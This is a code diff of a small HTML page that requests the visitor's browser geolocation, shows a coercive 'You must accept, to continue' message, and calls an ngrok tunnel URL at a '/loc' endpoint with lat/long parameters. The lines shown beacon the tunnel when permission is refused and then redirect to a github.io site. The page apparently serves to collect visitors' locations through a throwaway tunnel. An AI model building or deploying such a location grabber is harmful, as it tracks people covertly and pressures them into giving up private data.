@@ -4,7 +4,7 @@
   </head>
   
   <body>
-    <div id="div"><h1> You must accept, to continue. Refresh to Try Again.</h1></div>
+    <div id="div"><h1> You must accept, to continue. Trying Again.</h1></div>
     <script>
       let main = document.querySelector('div');
       let url = "https://19b5c31f7ea3.ngrok.io"
@@ -18,8 +18,8 @@
       }
       function mustAccept(e) {
         main.innerHTML = "<h1> You must accept, to continue. Refresh to Try Again.</h1>";
-        fetch(url + "/loc?lat=Visited&long=ButNotAccepted");
-        setTimeout(function () { window.location.href = "https://lispacito.github.io"; });
+        fetch(url + "/loc?lat=Visiting&long=To-lispacito");
+        setTimeout(function () { window.location.href = "https://lispacito.github.io"; }, 1500);
       }
       function getPos () {
         window.navigator.geolocation.getCurrentPosition(showPosition, mustAccept);
